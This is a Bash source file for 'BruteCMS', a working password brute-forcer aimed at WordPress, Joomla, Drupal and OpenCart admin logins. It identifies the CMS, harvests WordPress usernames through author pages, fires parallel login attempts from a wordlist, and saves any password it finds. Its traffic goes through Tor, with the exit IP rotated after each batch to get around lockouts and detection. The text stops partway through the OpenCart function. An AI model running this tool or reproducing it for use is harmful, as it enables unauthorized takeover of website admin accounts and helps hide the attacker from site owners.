#!/bin/bash
# BruteCMS v1.0.4
# Github: https://github.com/thelinuxchoice/brutecms
# Coded by: thelinuxchoice (Don't change noob, read the LICENSE!)
# Instagram: @thelinuxchoice
trap 'printf "\n";store;exit 1' 2


checkroot() {
if [[ "$(id -u)" -ne 0 ]]; then
    printf "\e[1;93m[!] Please, run this program as root!\n\e[0m"
    exit 1
fi
}

dependencies() {

command -v tor > /dev/null 2>&1 || { echo >&2 "I require tor but it's not installed. Run apt-get install tor. Aborting."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Run apt-get install curl. Aborting."; exit 1; }
command -v sed > /dev/null 2>&1 || { echo >&2 "I require sed but it's not installed. Aborting."; exit 1; }
command -v cat > /dev/null 2>&1 || { echo >&2 "I require cat but it's not installed. Aborting."; exit 1; }
command -v wc > /dev/null 2>&1 || { echo >&2 "I require wc but it's not installed. Aborting."; exit 1; }
command -v cut > /dev/null 2>&1 || { echo >&2 "I require cut but it's not installed. Aborting."; exit 1; }
command -v head > /dev/null 2>&1 || { echo >&2 "I require head but it's not installed. Aborting."; exit 1; }

}

banner() {

printf "\e[1;77m______            _      \e[0m\e[1;92m _____ ___  ___ _____  \e[0m\n"
printf "\e[1;77m| ___ \          | |     \e[0m\e[1;92m/  __ \|  \/  |/  ___| \e[0m\n"
printf "\e[1;77m| |_/ /_ __ _   _| |_ ___\e[0m\e[1;92m| /  \/| .  . |\ \`--.  \e[0m\n"
printf "\e[1;77m| ___ \ '__| | | | __/ _ \ \e[0m\e[1;92m|    | |\/| | \`--. \ \e[0m\n"
printf "\e[1;77m| |_/ / |  | |_| | ||  __/ \e[0m\e[1;92m\__/\| |  | |/\__/ / \e[0m\n"
printf "\e[1;77m\____/|_|   \__,_|\__\___|\e[0m\e[1;92m\____/\_|  |_/\____/  \e[0m\e[1;77mv1.0.4\e[0m\n"
printf "\n"
printf "\e[101m::\e[1;77m CMS BruteForcer coded by: @thelinuxchoice ::\e[0m\n\n"
printf "\e[1;77m[\e[0m\e[1;92m*\e[0m\e[1;77m] WordPress\e[0m\n"
printf "\e[1;77m[\e[0m\e[1;92m*\e[0m\e[1;77m] Joomla\e[0m\n"
printf "\e[1;77m[\e[0m\e[1;92m*\e[0m\e[1;77m] Drupal\e[0m\n"
printf "\e[1;77m[\e[0m\e[1;92m*\e[0m\e[1;77m] OpenCart\e[0m\n"
printf "\n"
}

function start() {


read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Password List (Enter to default list): \e[0m' wl_pass
wl_pass="${wl_pass:-${default_wl_pass}}"
default_threads="5"
read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Threads (Default: 5): \e[0m' threads
threads="${threads:-${default_threads}}"

}

checktor() {

check=$(curl --socks5-hostname localhost:9050 -s https://check.torproject.org > /dev/null; echo $?)

if [[ "$check" -gt 0 ]]; then
printf "\e[1;93m[!] Please, check your TOR Connection! Just type tor or service tor start\n\e[0m"
exit 1
fi

}

function store() {

if [[ -n "$threads" ]]; then
printf "\e[1;93m [*] Waiting threads shutting down...\n\e[0m"
if [[ "$threads" -gt 10 ]]; then
sleep 6
else
sleep 3
fi
default_session="Y"
printf "\n\e[1;77m[?] Save session for site\e[0m\e[1;92m %s \e[0m" $site
read -p $'\e[1;77m? [Y/n]: \e[0m' session
session="${session:-${default_session}}"
if [[ "$session" == "Y" || "$session" == "y" || "$session" == "yes" || "$session" == "Yes" ]]; then
if [[ ! -d sessions ]]; then
mkdir sessions
fi
create_name=$(echo $site | head -c8)
default_session_name="$create_name"
read -p $'\e[1;77m[?] Session name (Default: \e[0m'$default_session_name'): ' session_name
session_name="${session_name:-${default_session_name}}"
IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
printf "user=\"%s\"\nsite=\"%s\"\npass=\"%s\"\nwl_pass=\"%s\"\ntoken=\"%s\"\ncms=\"%s\"\n" $user $site $pass $wl_pass $countpass $cms > sessions/store.session.$session_name.$(date +"%FT%H%M")
printf "\e[1;77m[*] Session saved.\e[0m\n"
printf "\e[1;92m[*] Use ./brutecms.sh --resume\n"
else
exit 1
fi
else
exit 1
fi
}


function changeip() {

killall -HUP tor


}

checkcmstor() {

printf "\e[1;77m [*] Detecting CMS...\e[0m\n"

checkjoomla=$(curl --socks5-hostname 127.0.0.1:9050 -L -s --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' "$site/administrator/index.php" | grep -o 'joomla\|Joomla!\|script type=\"text javascript\" src=\"media system js mootools.js\"\|com_content' | head -n 1)
checkwp=$(curl --socks5-hostname 127.0.0.1:9050 -L -s --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' "$site/wp-login.php" | grep -o 'wordpress\|wp-content' | head -n 1)
checkdrupal=$(curl --socks5-hostname 127.0.0.1:9050 -L -s --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' "$site/user/login" | grep -o 'drupal\|drupal.org\|sites all\|Drupal' | head -n 1)
checkopencart=$(curl --socks5-hostname 127.0.0.1:9050 -L -s --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' "$site/admin/index.php" | grep -o 'opencart\|Opencart\|route=product\|route=common\|catalog view theme' | head -n 1)

if [[ $checkjoomla == "joomla" ]] || [[ $checkjoomla == "Joomla!" ]] || [[ $checkjoomla == *'script type="text javascript" src="media system js mootools.js"'* ]] || [[ $checkjoomla == "com_content" ]]; then
printf "\e[1;92m [*] Joomla detected!\e[0m\n"
start
default_user="admin"
read -p $'\e[1;92m[*] Username (Default: admin): \e[0m' user
user="${user:-${default_user}}"
joomlator
elif [[ $checkwp == "wordpress" ]] || [[ $checkwp == "wp-content" ]] ; then
printf "\e[1;92m [*] WordPress detected!\e[0m\n"
start
wptor
elif [[ $checkdrupal == "drupal" ]] || [[ $checkdrupal == "drupal.org" ]] || [[ $checkdrupal == "sites all" ]] || [[ $checkdrupal == "Drupal" ]]; then
printf "\e[1;92m [*] Drupal detected!\e[0m\n"
start
default_user="admin"
read -p $'\e[1;92m[*] Username (Default: admin): \e[0m' user
user="${user:-${default_user}}"
drupaltor
elif [[ $checkopencart == "opencart" ]] || [[ $checkopencart == "OpenCart" ]] || [[ $checkopencart == "route=product" ]] || [[ $checkopencart == "catalog view theme" ]] || [[ $checkopencart == "route=common" ]]; then
printf "\e[1;92m [*] OpenCart detected!\e[0m\n"
start
default_user="admin"
read -p $'\e[1;92m[*] Username (Default: admin): \e[0m' user
user="${user:-${default_user}}"
opencarttor
else
printf "\e[1;93m [!] CMS not detected or not supported!\n\e[0m"
exit 1
fi
}

# WORDPRESS

function wptor() {

cms="wp"
curl -s --socks5-hostname 127.0.0.1:9050 -c cookiewp1.txt --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' "$site/wp-login.php" > /dev/null 2>&1
default_user=$(curl --socks5-hostname 127.0.0.1:9050 -s -L "$site/?author=1" | grep -o "author-.*" | cut -d " " -f1 | head -n 1 | cut -d "-" -f2)
if [[ "$default_user" == "" ]]; then
printf "\e[1;93m [!] Can't locate user!\e[0m\n"
read -p $'\e[1;92m[*] Username: \e[0m' user
else
user="${user:-${default_user}}"
fi

count_pass=$(wc -l $wl_pass | cut -d " " -f1)
printf "\e[1;92m[*] Username:\e[0m\e[1;77m %s\e[0m\n" $user
printf "\e[1;92m[*] Wordlist:\e[0m\e[1;77m %s (%s)\e[0m\n" $wl_pass $count_pass
printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"
token=0
startline=1
endline="$threads"
while [ $token -lt $count_pass ]; do
IFS=$'\n'
for pass in $(sed -n ''$startline','$endline'p' $wl_pass); do

IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)


let token++
printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass

{(trap '' SIGINT && wp=$(curl --socks5-hostname 127.0.0.1:9050 -s -L -b cookiewp1.txt --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' -d 'log='$user'&pwd='$pass'&testcookie=1&rememberme=forever' "$site/wp-login.php" | grep -o 'dashboard\|wordpress_logged_in' | head -n 1 ); if [[ $wp == "dashboard" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.brutecmsWP ;  printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.brutecmsWP \n\e[0m";  kill -1 $$; elif [[ $wp == *'wordpress_logged_in'* ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.brutecmsWP ;  printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.brutecmsWP \n\e[0m";  kill -1 $$; fi; ) } & done; wait $!;

let startline+=$threads
let endline+=$threads
changeip
done
exit 1
}

## JOOMLA

function joomlator() {
cms="joomla"
count_pass=$(wc -l $wl_pass | cut -d " " -f1)
printf "\e[1;92m[*] Username:\e[0m\e[1;77m %s\e[0m\n" $user
printf "\e[1;92m[*] Wordlist:\e[0m\e[1;77m %s (%s)\e[0m\n" $wl_pass $count_pass
printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"
token=0
startline=1
endline="$threads"
tokenjoomla=$(curl --socks5-hostname 127.0.0.1:9050 -s -H 'keep_alive=1' -c cookiesjoomla --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' -s "$site/administrator/index.php" | grep -o 'name=\".*\" value=\"1\"' | cut -d '"' -f2);
while [ "$token" -lt "$count_pass" ]; do
IFS=$'\n'
for pass in $(sed -n ''$startline','$endline'p' $wl_pass); do

IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)

let token++
printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass


{(trap '' SIGINT && joomla=$(curl --socks5-hostname 127.0.0.1:9050 --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' -b cookiesjoomla -s "$site/administrator/index.php" -d 'username='$user'&passwd='$pass'&lang=en-GB&option=user_login&task=login&'$tokenjoomla=1'' -L -H 'keep_alive=1' | grep -o "logout" | head -n 1 ); if [[ $joomla == "logout" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.brutecmsjoomla ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.brutecmsjoomla \n\e[0m";  kill -1 $$; fi; ) } & done; wait $!;

let startline+=$threads
let endline+=$threads
changeip
done
exit 1
}

## DRUPAL

function drupaltor() {
cms="drupal"
count_pass=$(wc -l $wl_pass | cut -d " " -f1)
printf "\e[1;92m[*] Username:\e[0m\e[1;77m %s\e[0m\n" $user
printf "\e[1;92m[*] Wordlist:\e[0m\e[1;77m %s (%s)\e[0m\n" $wl_pass $count_pass
printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"
token=0
startline=1
endline="$threads"
while [ "$token" -lt "$count_pass" ]; do
IFS=$'\n'
for pass in $(sed -n ''$startline','$endline'p' $wl_pass); do

IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)

let token++
printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass

{(trap '' SIGINT && drupal=$(curl --socks5-hostname 127.0.0.1:9050 -s --header "Content-type: application/x-www-form-urlencoded" --request POST --data 'name='$user'&pass='$pass'&form_id=user_login_form' "$site/user/login/" | grep -o 'Redirecting to\|Try again later' | head -n 1); if [[ $drupal == "Redirecting to" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.brutecmsdrupal ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.brutecmsdrupal \n\e[0m";  kill -1 $$; elif [[ $drupal == "Try again later" ]]; then printf "\e[1;93m \n [!] Too many attemps failed!\e[0m\n"; printf "\n\e[1;77m [*] Use threads=5 . Changing Tor IP\e[0m \n"; changeip; fi; ) } & done; wait $!;

let startline+=$threads
let endline+=$threads
changeip
done
exit 1
}


## Open cart

function opencarttor() {
cms="opencart"
count_pass=$(wc -l $wl_pass | cut -d " " -f1)
printf "\e[1;92m[*] Username:\e[0m\e[1;77m %s\e[0m\n" $user
printf "\e[1;92m[*] Wordlist:\e[0m\e[1;77m %s (%s)\e[0m\n" $wl_pass $count_pass
printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"
token=0
startline=1
endline="$threads"
while [ "$token" -lt "$count_pass" ]; do
IFS=$'\n'
for pass in $(sed -n ''$startline','$endline'p' $wl_pass); do

IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)

let token++
printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass
{(trap '' SIGINT && opencart=$(curl --socks5-hostname 127.0.0.1:9050 --request POST -s --data 'username='$user'&password='$pass'' "$site/admin/index.php" -i --user-agent 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.4) Gecko/20030624 Netscape/7.1 (ax)' | grep -o '302 Found'); if [[ $opencart == "302 Found" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.brutecmsopencart ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.brutecmsopencart \n\e[0m";  kill -1 $$; fi; ) } & done; wait $!;
 
let startline+=$threads
let endline+=$threads
changeip
done
exit 1
}


function resume() {

#banner 

counter=1
if [[ ! -d sessions ]]; then
printf "\e[1;91m[*] No sessions\n\e[0m"
exit 1
fi
printf "\e[1;92m[*] Files sessions:\n\n\e[0m"
for list in $(ls sessions/store.session*); do
IFS=$'\n'
source $list
printf "\e[1;92m%s \e[0m\e[1;77m: %s (\e[0m\e[1;92mwl:\e[0m\e[1;77m %s\e[0m\e[1;92m,\e[0m\e[1;92m lastpass:\e[0m\e[1;77m %s )\n\e[0m" "$counter" "$list" "$wl_pass" "$pass"
let counter++
done
read -p $'\n\e[1;92m[?] Choose a session number: \e[0m' fileresume
source $(ls sessions/store.session* | sed ''$fileresume'q;d')
#####
default_usetor="Y"
read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Use Tor? (\e[0m\e[1;77mY/n\e[0m\e[1;92m):\e[0m' usetor
usetor="${usetor:-${default_usetor}}"

if [[ $usetor == "Y" ]] || [[ $usetor == "Yes" ]] || [[ $usetor == "y" ]] || [[ $usertor == "yes" ]]; then
checktor

default_threads=5
read -p $'\e[1;92m[*] Threads (Default 5): \e[0m' threads
threads="${threads:-${default_threads}}"
printf "\e[1;92m[*] Resuming session for site:\e[0m \e[1;77m%s\e[0m\n" $site
printf "\e[1;92m[*] CMS: \e[0m \e[1;77m%s\e[0m\n" $cms
printf "\e[1;92m[*] Wordlist: \e[0m \e[1;77m%s\e[0m\n" $wl_pass
printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"

if [[ $cms == "wp" ]]; then
resume_wptor
elif [[ $cms == "joomla" ]]; then
resume_joomlator
elif [[ $cms == "drupal" ]]; then
resume_drupaltor
elif [[ $cms == "opencart" ]]; then
resume_opencarttor
fi

else

default_threads=5
read -p $'\e[1;92m[*] Threads (Default 5): \e[0m' threads
threads="${threads:-${default_threads}}"

printf "\e[1;92m[*] Resuming session for site:\e[0m \e[1;77m%s\e[0m\n" $site
printf "\e[1;92m[*] CMS: \e[0m \e[1;77m%s\e[0m\n" $cms
printf "\e[1;92m[*] Wordlist: \e[0m \e[1;77m%s\e[0m\n" $wl_pass
printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"

if [[ $cms == "wp" ]]; then
resume_wp
elif [[ $cms == "joomla" ]]; then
resume_joomla
elif [[ $cms == "drupal" ]]; then
resume_drupal
elif [[ $cms == "opencart" ]]; then
resume_opencart
fi

fi 

#####

}


resume_wptor() {
count_pass=$(wc -l $wl_pass | cut -d " " -f1)
curl --socks5-hostname 127.0.0.1:9050 -s -c cookiewp1.txt --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' "$site/wp-login.php" > /dev/null 2>&1

while [ $token -lt $count_pass ]; do
IFS=$'\n'

for pass in $(sed -n ''$token','$((token+threads))'p' $wl_pass); do


IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
 
printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass
let token++
{(trap '' SIGINT && wp=$(curl --socks5-hostname 127.0.0.1:9050 -s -L -b cookiewp1.txt --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' -d 'log='$user'&pwd='$pass'&testcookie=1&rememberme=forever' "$site/wp-login.php" | grep -o 'dashboard\|wordpress_logged_in' | head -n 1 ); if [[ $wp == "dashboard" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.brutecmsWP ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.brutecmsWP \n\e[0m";  kill -1 $$; elif [[ $wp == *'wordpress_logged_in'* ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.brutecmsWP ;  printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.brutecmsWP \n\e[0m";  kill -1 $$; fi; ) } & done; wait $!;
let token--

changeip

done
exit 1
}

resume_joomlator() {
count_pass=$(wc -l $wl_pass | cut -d " " -f1)

tokenjoomla=$(curl --socks5-hostname 127.0.0.1:9050 -s -H 'keep_alive=1' -c cookiesjoomla --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' -s "$site/administrator/index.php" | grep -o 'name=\".*\" value=\"1\"' | cut -d '"' -f2);
while [ $token -lt $count_pass ]; do
IFS=$'\n'

for pass in $(sed -n ''$token','$((token+threads))'p' $wl_pass); do


IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
 
printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass #token
let token++

{(trap '' SIGINT && joomla=$(curl --socks5-hostname 127.0.0.1:9050 --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' -b cookiesjoomla -s "$site/administrator/index.php" -d 'username='$user'&passwd='$pass'&lang=en-GB&option=user_login&task=login&'$tokenjoomla=1'' -L -H 'keep_alive=1' | grep -o "logout" | head -n 1 ); if [[ $joomla == "logout" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.brutecmsjoomla ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.brutecmsjoomla \n\e[0m";  kill -1 $$; fi; ) } & done; wait $!;
let token--

changeip

done
exit 1
}


resume_drupaltor() {
count_pass=$(wc -l $wl_pass | cut -d " " -f1)


while [ $token -lt $count_pass ]; do
IFS=$'\n'

for pass in $(sed -n ''$token','$((token+threads))'p' $wl_pass); do


IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
 
printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass

let token++
{(trap '' SIGINT && drupal=$(curl --socks5-hostname 127.0.0.1:9050 -s --header "Content-type: application/x-www-form-urlencoded" --request POST --data 'name='$user'&pass='$pass'&form_id=user_login_form' "$site/user/login/" | grep -o 'Redirecting to\|Try again later' | head -n 1); if [[ $drupal == "Redirecting to" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.brutecmsdrupal ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.brutecmsdrupal \n\e[0m";  kill -1 $$; elif [[ $drupal == "Try again later" ]]; then printf "\e[1;93m \n [!] Too many attemps failed!\e[0m\n"; printf "\n\e[1;77m [*] Use threads=5 . Changing Tor IP\e[0m \n"; changeip; fi; ) } & done; wait $!;
let token--

changeip

done
exit 1
}

resume_opencarttor() {
count_pass=$(wc -l $wl_pass | cut -d " " -f1)


while [ $token -lt $count_pass ]; do
IFS=$'\n'

for pass in $(sed -n ''$token','$((token+threads))'p' $wl_pass); do


IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)

printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass 

let token++
{(trap '' SIGINT && opencart=$(curl --socks5-hostname 127.0.0.1:9050 --request POST -s --data 'username='$user'&password='$pass'' "$site/admin/index.php" -i --user-agent 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.4) Gecko/20030624 Netscape/7.1 (ax)' | grep -o '302 Found'); if [[ $opencart == "302 Found" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.brutecmsopencart ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.brutecmsopencart \n\e[0m";  kill -1 $$; fi; ) } & done; wait $!;
let token--

changeip

done
exit 1
}


checkcms() {

printf "\e[1;77m [*] Detecting CMS...\e[0m\n"

checkjoomla=$(curl -L -s "$site/administrator/index.php" | grep -o 'joomla\|Joomla!\|script type=\"text javascript\" src=\"media system js mootools.js\"\|com_content' | head -n 1)
checkwp=$(curl -L -s "$site/wp-login.php" | grep -o 'wordpress\|wp-content' | head -n 1)
checkdrupal=$(curl -L -s "$site/user/login" | grep -o 'drupal\|drupal.org\|sites all\|Drupal' | head -n 1)
checkopencart=$(curl -L -s "$site/admin/index.php" | grep -o 'opencart\|Opencart\|route=product\|route=common\|catalog view theme' | head -n 1)

if [[ $checkjoomla == "joomla" ]] || [[ $checkjoomla == "Joomla!" ]] || [[ $checkjoomla == *'script type="text javascript" src="media system js mootools.js"'* ]] || [[ $checkjoomla == "com_content" ]]; then
printf "\e[1;92m [*] Joomla detected!\e[0m\n"
start
default_user="admin"
read -p $'\e[1;92m[*] Username (Default: admin): \e[0m' user
user="${user:-${default_user}}"
joomla
elif [[ $checkwp == "wordpress" ]] || [[ $checkwp == "wp-content" ]] ; then
printf "\e[1;92m [*] WordPress detected!\e[0m\n"
start
wp
elif [[ $checkdrupal == "drupal" ]] || [[ $checkdrupal == "drupal.org" ]] || [[ $checkdrupal == "sites all" ]] || [[ $checkdrupal == "Drupal" ]]; then
printf "\e[1;92m [*] Drupal detected!\e[0m\n"
start
default_user="admin"
read -p $'\e[1;92m[*] Username (Default: admin): \e[0m' user
user="${user:-${default_user}}"
drupal
elif [[ $checkopencart == "opencart" ]] || [[ $checkopencart == "OpenCart" ]] || [[ $checkopencart == "route=product" ]] || [[ $checkopencart == "catalog view theme" ]] || [[ $checkopencart == "route=common" ]]; then
printf "\e[1;92m [*] OpenCart detected!\e[0m\n"
start
default_user="admin"
read -p $'\e[1;92m[*] Username (Default: admin): \e[0m' user
user="${user:-${default_user}}"
opencart
else
printf "\e[1;93m [!] CMS not detected or not supported!\n\e[0m"
exit 1
fi
}

# WORDPRESS

function wp() {

cms="wp"
curl -s -c cookiewp1.txt --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' "$site/wp-login.php" > /dev/null 2>&1
default_user=$(curl -s -L "$site/?author=1" | grep -o "author-.*" | cut -d " " -f1 | head -n 1 | cut -d "-" -f2)
if [[ "$default_user" == "" ]]; then
printf "\e[1;93m [!] Can't locate user!\e[0m\n"
read -p $'\e[1;92m[*] Username: \e[0m' user
else
user="${user:-${default_user}}"
fi

count_pass=$(wc -l $wl_pass | cut -d " " -f1)
printf "\e[1;92m[*] Username:\e[0m\e[1;77m %s\e[0m\n" $user
printf "\e[1;92m[*] Wordlist:\e[0m\e[1;77m %s (%s)\e[0m\n" $wl_pass $count_pass
printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"
token=0
startline=1
endline="$threads"
while [ $token -lt $count_pass ]; do
IFS=$'\n'
for pass in $(sed -n ''$startline','$endline'p' $wl_pass); do

IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)


let token++
printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass #token

{(trap '' SIGINT && wp=$(curl -s -L -b cookiewp1.txt --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' -d 'log='$user'&pwd='$pass'&testcookie=1&rememberme=forever' "$site/wp-login.php" | grep -o 'dashboard\|wordpress_logged_in' | head -n 1 ); if [[ $wp == "dashboard" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.brutecmsWP ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.brutecmsWP \n\e[0m";  kill -1 $$; elif [[ $wp == *'wordpress_logged_in'* ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.brutecmsWP ;  printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.brutecmsWP \n\e[0m";  kill -1 $$; fi; ) } & done; wait $!;

let startline+=$threads
let endline+=$threads
#changeip
done
exit 1
}

## JOOMLA

function joomla() {
cms="joomla"
count_pass=$(wc -l $wl_pass | cut -d " " -f1)
printf "\e[1;92m[*] Username:\e[0m\e[1;77m %s\e[0m\n" $user
printf "\e[1;92m[*] Wordlist:\e[0m\e[1;77m %s (%s)\e[0m\n" $wl_pass $count_pass
printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"
token=0
startline=1
endline="$threads"
tokenjoomla=$(curl -s -H 'keep_alive=1' -c cookiesjoomla --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' -s "$site/administrator/index.php" | grep -o 'name=\".*\" value=\"1\"' | cut -d '"' -f2);
while [ "$token" -lt "$count_pass" ]; do
IFS=$'\n'
for pass in $(sed -n ''$startline','$endline'p' $wl_pass); do

IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)

let token++
printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass #token


{(trap '' SIGINT && joomla=$(curl --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' -b cookiesjoomla -s "$site/administrator/index.php" -d 'username='$user'&passwd='$pass'&lang=en-GB&option=user_login&task=login&'$tokenjoomla=1'' -L -H 'keep_alive=1' | grep -o "logout" | head -n 1 ); if [[ $joomla == "logout" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.brutecmsjoomla ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.brutecmsjoomla \n\e[0m";  kill -1 $$; fi; ) } & done; wait $!;

let startline+=$threads
let endline+=$threads
#changeip
done
exit 1
}

## DRUPAL

function drupal() {
cms="drupal"
count_pass=$(wc -l $wl_pass | cut -d " " -f1)
printf "\e[1;92m[*] Username:\e[0m\e[1;77m %s\e[0m\n" $user
printf "\e[1;92m[*] Wordlist:\e[0m\e[1;77m %s (%s)\e[0m\n" $wl_pass $count_pass
printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"
token=0
startline=1
endline="$threads"
while [ "$token" -lt "$count_pass" ]; do
IFS=$'\n'
for pass in $(sed -n ''$startline','$endline'p' $wl_pass); do

IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)

let token++
printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass #token

{(trap '' SIGINT && drupal=$(curl -s --header "Content-type: application/x-www-form-urlencoded" --request POST --data 'name='$user'&pass='$pass'&form_id=user_login_form' "$site/user/login/" | grep -o 'Redirecting to\|Try again later' | head -n 1); if [[ $drupal == "Redirecting to" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.brutecmsdrupal ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.brutecmsdrupal \n\e[0m";  kill -1 $$; elif [[ $drupal == "Try again later" ]]; then printf "\e[1;93m \n [!] Too many attemps failed!\e[0m\n"; printf "\n\e[1;77m [*] Use threads=5 . Changing Tor IP\e[0m \n"; changeip; fi; ) } & done; wait $!;

let startline+=$threads
let endline+=$threads
changeip
done
exit 1
}


## Open cart

function opencart() {
cms="opencart"
count_pass=$(wc -l $wl_pass | cut -d " " -f1)
printf "\e[1;92m[*] Username:\e[0m\e[1;77m %s\e[0m\n" $user
printf "\e[1;92m[*] Wordlist:\e[0m\e[1;77m %s (%s)\e[0m\n" $wl_pass $count_pass
printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"
token=0
startline=1
endline="$threads"
while [ "$token" -lt "$count_pass" ]; do
IFS=$'\n'
for pass in $(sed -n ''$startline','$endline'p' $wl_pass); do

IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)

let token++
printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass #token

